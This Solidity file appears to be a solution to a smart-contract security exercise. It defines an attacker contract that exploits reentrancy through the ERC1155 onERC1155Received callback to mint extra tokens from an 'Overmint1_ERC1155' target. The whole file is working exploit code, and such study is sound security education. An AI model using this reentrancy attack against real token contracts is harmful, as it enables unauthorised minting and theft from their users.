// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";
import "../Overmint1-ERC1155.sol";

contract Overmint1_ERC1155_Attacker is IERC1155Receiver {
// contract Overmint1_ERC1155_Attacker {
    uint256 public constant tokenId = 0;

    Overmint1_ERC1155 public immutable target;
    address internal immutable owner;

    constructor(address _target, address _owner) {
        target = Overmint1_ERC1155(_target);
        owner = _owner;
    }

    function attack() external {
        target.mint(tokenId, "");
        target.safeTransferFrom(address(this), owner, tokenId, 1, "");
    }


    function onERC1155Received(
        address operator,
        address from,
        uint256 id,
        uint256 value,
        bytes calldata data
    ) external returns (bytes4) {
        if (target.balanceOf(address(this), tokenId) < 5) {
            target.mint(tokenId, "");
            target.safeTransferFrom(address(this), owner, tokenId, 1, "");
        }
        return IERC1155Receiver.onERC1155Received.selector;
    }

    function onERC1155BatchReceived(
        address operator,
        address from,
        uint256[] calldata ids,
        uint256[] calldata values,
        bytes calldata data
    ) external returns (bytes4) {
        return IERC1155Receiver.onERC1155BatchReceived.selector;
    }

    function supportsInterface(bytes4 interfaceId) external view returns (bool) {
        return interfaceId == type(IERC1155Receiver).interfaceId;
    }
}
